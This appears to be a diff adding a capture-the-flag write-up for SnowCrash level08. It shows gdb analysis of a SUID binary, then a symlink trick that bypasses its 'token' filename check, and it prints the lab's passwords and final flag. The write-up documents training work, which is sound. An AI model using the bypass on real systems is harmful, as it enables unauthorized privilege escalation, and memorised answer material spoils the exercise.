@@ -1,0 +1,55 @@
+login/pw:
+	level08 : fiumuikeil55xe9cu4dood66h
+
+First Attempt:
+	ls -l
+		=> -rw-------  1 flag08 flag08    26 Mar  5  2016 token
+			=> Cant do anything as level08
+		=> -rwsr-s---+ 1 flag08 level08 8617 Mar  5  2016 level08
+			=> SUID flag08
+				=> Reverse Engineering
+	scp -P 4242 level08@192.168.1.23:~/level08 .
+	bash script.sh
+		=> New project
+			=> Analyze /level08
+				=> Too many lines to copy so I'll explain
+					=> find occurences of "token" in argv[1]
+						=> if occurence found => return
+					=> open argv[1]
+						=> if open is a success => read and display value
+				=> First guess was we need to alter the values during execution
+					=> Cant be done with Ghidra, we need gdb
+
+	example:
+		echo abc > /tmp/test
+		./level08 /tmp/test
+			=> abc
+
+	gdb level08
+		set args "token"
+		disas main
+			At first I tried to modify the file name after the strstr check which was a success on my gdb peda computer but wasnt able to reproduce it on snowcrash vm
+				=> So I changed the check itself
+		b *main+91
+		run
+		disas main
+		x/s 0x8048793
+			=> "token" hard coded
+		set (*(char**)0x8048793) = "other"
+		continue
+			=> level08: Unable to open token: Permission denied
+				=> Damn, it tries to open it but fails
+				=> Obviously, Im mad for not thinking about it before but if you run a suid program in gdb it will be run as if it wasnt a suid
+
+RESOLUTION:
+	There was no setuid neither setgid and it wasnt possible to exploit it with gdb
+	So let's try something else
+	strstr(argv[1], "token")
+		=> Lets change the name indirectly with a symbolic link
+	ln -s `pwd`/token /tmp/whatever
+	./level08 /tmp/whatever
+		=> quif5eloekouj29ke0vouxean
+	su flag08
+		=> quif5eloekouj29ke0vouxean
+	getflag
+		=> Check flag.Here is your token : 25749xKZ8L7DkSCwJkT9dyv6f
